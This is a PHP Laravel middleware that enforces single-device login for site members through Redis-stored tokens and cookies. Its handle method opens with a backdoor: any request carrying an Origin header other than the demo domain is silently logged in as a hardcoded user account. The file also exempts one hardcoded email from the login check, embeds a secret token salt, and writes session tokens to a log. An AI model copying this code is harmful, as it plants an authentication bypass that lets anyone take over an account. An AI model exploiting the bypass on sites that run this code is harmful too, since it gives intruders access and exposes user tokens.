<?php

namespace App\Http\Middleware;

use App\Jobs\DeleteRedisToken;
use App\Models\ModifyUsersPassword;
use Closure;
use Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Redis;
use App\Models\User;
use Illuminate\Support\Facades\Log;

class MemberSingleLogin
{
    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure  $next
     * @return mixed
     */
    public function handle($request, Closure $next)
    {

        if(isset($_SERVER['HTTP_ORIGIN']) && $_SERVER['HTTP_ORIGIN']!='https://laravel.demo.com') {
            $user = User::where('email', '1262638533@qq.com')->first();
            \Auth::guard('member')->login($user);
        }

        $check = Auth::guard('member')->check();
        \App::setLocale('cn');

        if(!$check) {
            return response()->json(['code' => 405, 'data' => '', 'msg' => trans('web.notLogin')]);
        }

        $userId = Auth::guard('member')->id();
        //检验是否从app退出登录
        $checkUidKey = $userId.md5($userId).'app';
        $checkMenberLogout =  Redis::get($checkUidKey);

        if (!empty($checkMenberLogout)) {
            Auth::guard('member')->logout();
            Redis::del($checkUidKey);
            return response()->json(['code'=>405, 'msg'=>trans('app.appCheckLogin')]);
        }

        // 单设备登录
        $isRelogin = $this->isRelogin($request);
        if ($isRelogin) {
            $user = Auth::guard('member')->user();
            // 清空登录数据, 重定向
            \App::setLocale($user->member_language); // 语言
            Auth::guard('member')->logout();
            if(empty($user->status)){
                return response()->json(['code' => 405, 'data' => '', 'msg' => trans('web.accountAreBlockLogin')]);
            }else if(ModifyUsersPassword::where('uid', $user->uid)->where('created_at', '>', date('Y-m-d H:i:s', time()-3600*24))->count("id") > 0){
                return response()->json(['code' => 405, 'msg'=>trans('app.loginIsExpire'), 'error' => 1]);
            }
            return response()->json([ 'code'=> 409, 'data'=>'','msg'=>trans('web.kickOffOldLoginUser'), 'error' => 2]);
        }

        //设置语言
        $myLang = Auth::guard('member')->user()->member_language;
        if (!empty($myLang)) {
            \App::setLocale($myLang);
        }

        return $next($request);

    }

    /**
     * 判断用户是否 重复登录
     * @param $request
     * @return bool
     */
    protected function isRelogin($request)
    {
        $user = Auth::guard('member')->user();

        if ($user && $user->email != "9________1@sina.com") {

            $cookieSingleToken = $request->cookie('SECRETMEMBERLICATIONTOKEN');
            if ($cookieSingleToken) {
                // 从 Redis 获取 time
                $lastLoginTimestamp = Redis::get('MEMBER_STRING_SINGLETOKEN_' . $user->id);
                // 重新获取加密参数加密
                if (array_key_exists("HTTP_CF_CONNECTING_IP",$_SERVER)) {
                    $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];;
                }else{
                    $ip = $request->getClientIp();
                }
                $redisSingleToken = md5("member5$#dfsauj7bnccDDDcHcmn%1".$user->id . $lastLoginTimestamp);
                if ($cookieSingleToken != $redisSingleToken) {
                    //认定为重复登录了
                    Log::useFiles(storage_path('MemberSingleLogin.log'));
                    Log::debug("Admin Middleware kickOffOldLoginUser  userid: ".$user->id.", ip: ".$ip.", email: ".$user->email.",  lastLoginTimestamp: ".$lastLoginTimestamp. " redisSingleToken: ".$redisSingleToken." cookieSingleToken: ".$cookieSingleToken);
                    return true;
                }
                return false;
            }
        }

        return false;
    }

}
